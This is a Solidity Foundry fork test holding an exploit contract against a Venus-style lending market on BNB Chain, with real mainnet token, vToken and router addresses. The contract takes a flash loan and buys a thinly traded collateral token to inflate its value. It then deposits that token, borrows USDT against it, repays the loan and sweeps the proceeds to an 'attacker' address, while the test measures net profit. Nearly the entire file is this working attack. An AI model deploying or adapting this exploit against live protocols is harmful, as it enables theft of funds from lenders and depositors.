// SPDX-License-Identifier: BSD-3-Clause
pragma solidity 0.8.25;

import { Test, console2 } from "forge-std/Test.sol";

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IVTokenLike {
    function underlying() external view returns (address);
    function comptroller() external view returns (address);
    function mint(uint256 amount) external returns (uint256);
    function borrow(uint256 amount) external returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function borrowBalanceStored(address account) external view returns (uint256);
}

interface IComptrollerLike {
    function enterMarkets(address[] calldata vTokens) external returns (uint256[] memory);
}

interface IPancakePairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPancakeRouterLike {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract CandidateFlashBorrower {
    address public immutable attacker;
    IPancakePairLike public immutable flashPair;
    IPancakeRouterLike public immutable router;
    IERC20Like public immutable flashToken;
    IERC20Like public immutable collateralToken;
    IVTokenLike public immutable collateralVToken;
    IVTokenLike public immutable debtVToken;
    IERC20Like public immutable debtToken;
    uint256 public immutable flashAmount;
    uint256 public immutable borrowAmount;
    uint256 public immutable repayNumerator;
    uint256 public immutable repayDenominator;
    address[] public buyPath;
    address[] public exitPath;

    event CandidateExecuted(
        uint256 collateralReceived,
        uint256 debtBorrowed,
        uint256 flashRepaid,
        uint256 liquidFlashRemaining,
        uint256 residualCollateralVTokens,
        uint256 residualDebt
    );

    modifier onlyAttacker() {
        require(msg.sender == attacker, "only attacker");
        _;
    }

    constructor(
        address attacker_,
        address flashPair_,
        address router_,
        address flashToken_,
        address collateralVToken_,
        address debtVToken_,
        uint256 flashAmount_,
        uint256 borrowAmount_,
        uint256 repayNumerator_,
        uint256 repayDenominator_,
        address[] memory buyPath_,
        address[] memory exitPath_
    ) {
        attacker = attacker_;
        flashPair = IPancakePairLike(flashPair_);
        router = IPancakeRouterLike(router_);
        flashToken = IERC20Like(flashToken_);
        collateralVToken = IVTokenLike(collateralVToken_);
        debtVToken = IVTokenLike(debtVToken_);
        collateralToken = IERC20Like(IVTokenLike(collateralVToken_).underlying());
        debtToken = IERC20Like(IVTokenLike(debtVToken_).underlying());
        flashAmount = flashAmount_;
        borrowAmount = borrowAmount_;
        repayNumerator = repayNumerator_;
        repayDenominator = repayDenominator_;
        buyPath = buyPath_;
        exitPath = exitPath_;

        require(flashPair.token0() == flashToken_ || flashPair.token1() == flashToken_, "flash token not in pair");
        require(buyPath_.length >= 2 && buyPath_[0] == flashToken_ && buyPath_[buyPath_.length - 1] == address(collateralToken), "bad buy path");
        if (address(debtToken) != flashToken_) {
            require(exitPath_.length >= 2 && exitPath_[0] == address(debtToken) && exitPath_[exitPath_.length - 1] == flashToken_, "bad exit path");
        }
    }

    function execute() external onlyAttacker {
        uint256 amount0 = flashPair.token0() == address(flashToken) ? flashAmount : 0;
        uint256 amount1 = flashPair.token1() == address(flashToken) ? flashAmount : 0;
        flashPair.swap(amount0, amount1, address(this), hex"01");
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        _afterFlash(sender, amount0, amount1);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        _afterFlash(sender, amount0, amount1);
    }

    function _afterFlash(address sender, uint256 amount0, uint256 amount1) internal {
        require(msg.sender == address(flashPair), "wrong callback pair");
        require(sender == address(this), "wrong flash initiator");
        require(amount0 == 0 || amount1 == 0, "two-sided flash unsupported");
        uint256 borrowedFlash = amount0 == 0 ? amount1 : amount0;
        require(borrowedFlash == flashAmount, "unexpected flash amount");

        require(flashToken.approve(address(router), borrowedFlash), "buy approval failed");
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            borrowedFlash,
            0,
            buyPath,
            address(this),
            block.timestamp + 3600
        );
        uint256 collateralReceived = collateralToken.balanceOf(address(this));
        require(collateralReceived != 0, "no collateral received");

        address[] memory markets = new address[](1);
        markets[0] = address(collateralVToken);
        uint256[] memory enterResults = IComptrollerLike(collateralVToken.comptroller()).enterMarkets(markets);
        require(enterResults.length == 1 && enterResults[0] == 0, "enter market failed");
        require(collateralToken.approve(address(collateralVToken), collateralReceived), "mint approval failed");
        require(collateralVToken.mint(collateralReceived) == 0, "collateral mint failed");
        require(debtVToken.borrow(borrowAmount) == 0, "debt borrow failed");

        uint256 debtReceived = debtToken.balanceOf(address(this));
        if (address(debtToken) != address(flashToken)) {
            require(debtToken.approve(address(router), debtReceived), "exit approval failed");
            router.swapExactTokensForTokens(debtReceived, 0, exitPath, address(this), block.timestamp + 3600);
        }

        // Configurable so the harness can model the actual pair's fee. The default 1000/997
        // is a conservative overpayment for common Uniswap-V2-style pairs; excess reduces net P&L.
        uint256 repay = (borrowedFlash * repayNumerator) / repayDenominator + 1;
        require(flashToken.balanceOf(address(this)) >= repay, "flash repayment shortfall");
        require(flashToken.transfer(address(flashPair), repay), "repay transfer failed");

        uint256 liquidFlashRemaining = flashToken.balanceOf(address(this));
        _sweep(flashToken);
        _sweep(debtToken);
        _sweep(collateralToken);
        emit CandidateExecuted(
            collateralReceived,
            debtReceived,
            repay,
            liquidFlashRemaining,
            collateralVToken.balanceOf(address(this)),
            debtVToken.borrowBalanceStored(address(this))
        );
    }

    function _sweep(IERC20Like token) internal {
        uint256 balance = token.balanceOf(address(this));
        if (balance != 0) require(token.transfer(attacker, balance), "sweep failed");
    }
}

contract GameFiStaleCollateralForkTest is Test {
    address internal constant RACA = 0x12BB890508c125661E03b09EC06E404bc9289040;
    address internal constant FLOKI = 0xfb5B838b6cfEEdC2873aB27866079AC55363D37E;
    address internal constant V_RACA = 0xE5FE5527A5b76C75eedE77FdFA6B80D52444A465;
    address internal constant V_FLOKI = 0xc353B7a1E13dDba393B5E120D4169Da7185aA2cb;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant V_USDT = 0x4978591f17670A846137d9d613e333C38dc68A37;
    address internal constant V_USDD = 0x9f2FD23bd0A5E08C5f2b9DD6CF9C96Bfb5fA515C;
    address internal constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function testForkCandidate_executeRepayAndMeasureNet() public {
        string memory rpc = vm.envString("RPC_URL");
        uint256 blockNumber = vm.envUint("BLOCK");
        vm.createSelectFork(rpc, blockNumber);

        address flashPair = vm.envAddress("FLASH_PAIR");
        address flashToken = vm.envOr("FLASH_TOKEN", USDT);
        address collateralVToken = vm.envOr("COLLATERAL_VTOKEN", V_RACA);
        address debtVToken = vm.envOr("DEBT_VTOKEN", V_USDT);
        uint256 flashAmount = vm.envOr("FLASH_AMOUNT", uint256(10_000 ether));
        uint256 borrowAmount = vm.envOr("BORROW_AMOUNT", uint256(1_000 ether));
        uint256 repayNumerator = vm.envOr("REPAY_NUMERATOR", uint256(1_000));
        uint256 repayDenominator = vm.envOr("REPAY_DENOMINATOR", uint256(997));
        bool requireProfit = vm.envOr("REQUIRE_PROFIT", false);
        bool expectRevert = vm.envOr("EXPECT_REVERT", false);
        int256 minimumFlashNet = vm.envOr("MIN_FLASH_NET", int256(0));

        address collateralToken = IVTokenLike(collateralVToken).underlying();
        address debtToken = IVTokenLike(debtVToken).underlying();
        address[] memory defaultBuyPath = new address[](2);
        defaultBuyPath[0] = flashToken;
        defaultBuyPath[1] = collateralToken;
        address[] memory defaultExitPath = new address[](2);
        defaultExitPath[0] = debtToken;
        defaultExitPath[1] = flashToken;
        address[] memory buyPath = vm.envOr("BUY_PATH", ",", defaultBuyPath);
        address[] memory exitPath = vm.envOr("EXIT_PATH", ",", defaultExitPath);

        CandidateFlashBorrower borrower = new CandidateFlashBorrower(
            address(this),
            flashPair,
            ROUTER,
            flashToken,
            collateralVToken,
            debtVToken,
            flashAmount,
            borrowAmount,
            repayNumerator,
            repayDenominator,
            buyPath,
            exitPath
        );

        uint256 initialFlash = IERC20Like(flashToken).balanceOf(address(this));
        uint256 initialDebt = IERC20Like(debtToken).balanceOf(address(this));
        if (expectRevert) vm.expectRevert();
        borrower.execute();
        if (expectRevert) {
            console2.log("expected revert observed; no profit claim");
            return;
        }
        uint256 finalFlash = IERC20Like(flashToken).balanceOf(address(this));
        uint256 finalDebt = IERC20Like(debtToken).balanceOf(address(this));

        int256 flashNet = int256(finalFlash) - int256(initialFlash);
        int256 debtNet = int256(finalDebt) - int256(initialDebt);
        console2.log("flash token liquid net before gas", flashNet);
        console2.log("debt token liquid net before gas", debtNet);
        console2.log("residual collateral vTokens", IVTokenLike(collateralVToken).balanceOf(address(borrower)));
        console2.log("residual borrow balance", IVTokenLike(debtVToken).borrowBalanceStored(address(borrower)));
        console2.log("residual collateral is not counted as liquid profit");
        if (requireProfit) {
            assertTrue(flashNet > minimumFlashNet, "candidate did not exceed minimum liquid flash-token delta");
        }
    }
}
